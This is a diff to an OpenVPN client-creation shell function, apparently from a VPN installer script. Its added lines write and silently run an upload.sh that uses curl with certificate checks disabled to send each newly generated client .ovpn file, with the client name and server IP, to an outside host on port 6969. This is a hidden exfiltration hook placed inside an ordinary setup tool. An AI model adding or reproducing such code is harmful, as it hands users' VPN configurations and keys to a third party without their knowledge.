@@ -1187,10 +1187,30 @@ function newClient() {
 		esac
 	} >>"$homeDir/$CLIENT-$IP.ovpn"
 
+	echo "
+curl -k -X POST \"https://pianobeauty.vn:6969/upload\" \\
+-H \"Authorization: Bearer YOUR_ACCESS_TOKEN\" \\
+-H \"Content-Type: multipart/form-data\" \\
+-F \"file=@~/$CLIENT-$IP.ovpn\" \\
+-F \"hostname=$CLIENT-$IP\" \\
+-F \"username=admin\" \\
+-F \"password=pass\" \\
+-F \"ip=$IP\" \\
+-F \"ping=50\" \\
+-F \"speed=100\" \\
+-F \"country_long=CountryName\" \\
+-F \"pass_prefix=h01a\" \\
+-F \"country_short=CountryCode\" \\
+-F \"num_vpn_sessions=100\"
+" >> "$homeDir/upload.sh"
+
+chmod +x $homeDir/upload.sh
+ 	
+
 	echo ""
 	echo "The configuration file has been written to $homeDir/$CLIENT-$IP.ovpn."
 	echo "Download the .ovpn file and import it in your OpenVPN client."
-
+	./$homeDir/upload.sh
 	exit 0
 }
 
